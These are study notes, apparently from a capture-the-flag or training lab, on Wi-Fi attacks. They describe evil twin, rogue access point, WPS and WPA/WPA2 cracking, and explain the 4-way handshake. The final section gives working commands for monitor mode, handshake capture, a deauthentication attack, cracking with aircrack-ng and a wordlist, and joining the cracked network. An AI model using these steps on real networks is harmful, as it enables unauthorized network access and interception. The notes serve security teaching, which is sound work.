# Notes for Day11

## Theme: **Wireless exploits**

## General:

# Attacks on Wi-Fi

There are several techniques attackers use to exploit Wi-Fi technology. The techniques discussed here are solely for educational purposes. Unauthorized attempts to access or compromise networks are illegal and may lead to severe legal consequences. With that in mind, here are some of the most popular techniques:

## Evil Twin Attack
- **Description**: The attacker creates a fake access point with a name similar to a trusted Wi-Fi access point. For example, a legitimate network named "Home_Internet" might be imitated as "Home_Internnet".
- **Method**: 
  1. The attacker sends de-authentication packets to users connected to the legitimate network, causing disconnections.
  2. Frustrated users see the fake network with stronger signal strength and connect to it.
  3. The attacker intercepts and monitors all traffic passing through the fake network.

---

## Rogue Access Point
- **Description**: An attacker sets up an open Wi-Fi access point near or inside an organization's premises to lure users into connecting.
- **Method**: 
  1. The attacker ensures the rogue access point has good signal strength.
  2. Devices configured to connect automatically to open networks may join this rogue access point.
  3. The attacker can intercept communication from connected devices.

---

## WPS Attack
- **Description**: Exploits vulnerabilities in Wi-Fi Protected Setup (WPS), which uses an 8-digit PIN for easy device connectivity.
- **Method**:
  1. The attacker initiates a WPS handshake with the router and captures its response.
  2. The captured data is brute-forced to retrieve the WPS PIN and the Pre-Shared Key (PSK).

---

## WPA/WPA2 Cracking
- **Description**: Exploits weaknesses in the WPA/WPA2 protocols, particularly relying on the length and complexity of the Pre-Shared Key (PSK).
- **Method**:
  1. The attacker sends de-authentication packets to disconnect a legitimate user.
  2. When the user reconnects, the 4-way handshake is captured.
  3. The attacker uses brute-force or dictionary attacks on the handshake file to crack the password.

---

These techniques underscore the importance of implementing strong passwords, disabling WPS, using modern encryption protocols, and monitoring Wi-Fi networks for rogue access points or suspicious activity.

# The 4-Way Handshake

The WPA password cracking process involves capturing a Wi-Fi network's handshake to attempt a PSK (Pre-Shared Key) decryption. Here's an overview:

1. **Preparation**:  
   An attacker places their wireless adapter into monitor mode to scan for networks. They target a specific network to capture the 4-way handshake.

2. **Capture**:  
   The attacker waits for a device to connect (or forces a disconnection using de-authentication packets) and captures the handshake during the reconnection process.

3. **Cracking**:  
   The attacker uses a tool like `aircrack-ng` to run a brute-force or dictionary attack, testing a wordlist against the captured handshake to attempt a match with the passphrase.

---

## What Is the WPA 4-Way Handshake?

The 4-way handshake is a process that allows a client device (e.g., a phone or laptop) and a Wi-Fi router to confirm they share the correct "password" (PSK) without directly sharing it. Here's how it works:

1. **Router Sends a Challenge**:  
   The router sends a "challenge" to the client, asking it to prove it knows the PSK without revealing it directly.

2. **Client Responds**:  
   The client takes the challenge and uses the PSK to create an encrypted response. This response can only be verified by the router if it also has the correct PSK.

3. **Router Confirms**:  
   If the router verifies the client’s response, it sends back its own confirmation.

4. **Final Check**:  
   The client verifies the router's response. If everything matches, a secure connection is established.

This handshake doesn't directly reveal the PSK but relies on encrypted exchanges based on the PSK.

---

## The Vulnerability

The vulnerability lies in the fact that an attacker can **capture the 4-way handshake** if they are listening when a device connects or reconnects to the network. Once the handshake is captured:

- The attacker performs **offline brute-force or dictionary attacks**, testing different possible passwords against the handshake data.
- If a match is found, the PSK is effectively cracked, granting the attacker access to the Wi-Fi network.

### Implications:
- **Strength of the PSK**: A weak or common password makes the network significantly more vulnerable to this attack.
- **Countermeasures**: Use long, complex passwords and WPA3 encryption (if supported) to mitigate such risks.

# Practical Steps for Capturing WPA Handshakes and Cracking WPA2 PSK

## 1. Check Available Wireless Devices
Run the following command to list available wireless devices:
```bash
iw dev
```
This command will show device details such as MAC addresses (BSSID) and operational modes (e.g., managed or monitor).

## 2. Scan for Nearby Wi-Fi Networks
To scan for available Wi-Fi networks, use:

```bash
sudo iw dev wlan2 scan
```
This provides details about nearby networks, including SSID, encryption types, and channels.

## 3. Switch to Monitor Mode
Follow these steps to switch your wireless adapter to monitor mode:

Bring the device down:
```bash
sudo ip link set dev wlan2 down
```
Set the mode to monitor:
```bash
sudo iw dev wlan2 set type monitor
```
Bring the device back up:
```bash
sudo ip link set dev wlan2 up
```
Verify the mode with:

```bash
sudo iw dev wlan2 info
```

## 4. Capture Wi-Fi Traffic (Handshake)
Use airodump-ng to start capturing Wi-Fi traffic:

```bash
sudo airodump-ng wlan2
```
After identifying the target network, focus the capture using:

```bash
sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
```

## 5. Perform a Deauthentication Attack
Force a client to disconnect and reconnect to the target network by performing a deauthentication attack:

```bash
sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
```
When the client reconnects, the handshake should be captured.

## 6. Crack WPA/WPA2 PSK
After capturing the handshake, attempt to crack it with a wordlist using aircrack-ng:

```bash
sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
```
The program will test each password from the wordlist to match the captured handshake.

## 7. Join the Target Network
Once the key is cracked, generate a configuration file for connecting to the network:

```bash
wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config
```
Connect to the network with:

```bash
sudo wpa_supplicant -B -c config -i wlan2
```
